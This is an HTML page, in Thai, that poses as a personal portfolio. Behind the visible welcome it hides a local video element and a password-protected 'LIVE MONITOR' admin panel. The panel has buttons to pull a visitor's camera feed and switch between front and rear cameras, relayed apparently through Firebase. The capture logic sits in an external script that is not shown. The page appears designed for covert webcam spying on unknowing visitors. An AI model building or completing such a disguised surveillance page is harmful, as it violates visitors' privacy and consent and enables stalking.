<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Space - Private Monitor</title>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;600&display=swap" rel="stylesheet">
    <style>
        :root { --bg-black: #0b0b0b; --main-purple: #8b5cf6; --white: #fff; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Kanit', sans-serif; }
        body { background-color: var(--bg-black); color: var(--white); overflow-x: hidden; }

        /* Login Overlay */
        #login-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center;
        }
        .login-box { background: #161616; padding: 40px; border-radius: 20px; border: 1px solid var(--main-purple); text-align: center; width: 320px; }
        input { padding: 12px; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; margin-bottom: 15px; width: 100%; text-align: center; }
        .btn { background: var(--main-purple); color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: 600; transition: 0.3s; }

        /* Admin Full Screen */
        #admin-panel { 
            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            background: #000; z-index: 9000; overflow: hidden;
        }
        #remoteVideo { width: 100%; height: 100%; object-fit: cover; background: #000; }
        .admin-controls {
            position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%);
            display: flex; gap: 15px; background: rgba(0,0,0,0.7); padding: 15px 25px;
            border-radius: 50px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1);
        }
        .status-badge { position: absolute; top: 20px; left: 20px; background: rgba(255,0,0,0.8); padding: 5px 15px; border-radius: 20px; font-size: 0.8rem; font-weight: bold; }

        /* User UI */
        #localVideo { display: none; }
        nav { padding: 20px 5%; display: flex; justify-content: space-between; border-bottom: 2px solid #4c1d95; }
        .hero { padding: 80px 10%; display: flex; flex-direction: column; align-items: center; text-align: center; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-box">
            <h2>🔑 ยืนยันสิทธิ์</h2>
            <input type="password" id="pass-input" placeholder="Password...">
            <button class="btn" onclick="checkLogin()">เข้าสู่ระบบ</button>
        </div>
    </div>

    <div id="admin-panel">
        <div class="status-badge">LIVE MONITOR: <span id="conn-text">รอกดเชื่อมต่อ</span></div>
        <video id="remoteVideo" autoplay playsinline></video>
        <div class="admin-controls">
            <button id="connectBtn" class="btn" style="width: auto; background: #10b981;" onclick="startListening()">📡 ดึงภาพจากกล้อง</button>
            <button class="btn" style="width: auto;" onclick="switchCamera()">🔄 สลับกล้องหน้า/หลัง</button>
            <button class="btn" style="width: auto; background: #333;" onclick="location.reload()">🔒 ออก</button>
        </div>
    </div>

    <nav><div class="logo">MY PORTFOLIO</div></nav>
    <header class="hero">
        <h1>ยินดีต้อนรับสู่<span>เว็บไซต์ของฉัน</span></h1>
        <p style="color: #888; margin-top: 10px;">ขอบคุณที่แวะมาเยี่ยมชมผลงานครับ</p>
    </header>

    <video id="localVideo" autoplay playsinline muted></video>

    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
    <script src="script.js"></script>
</body>
</html>
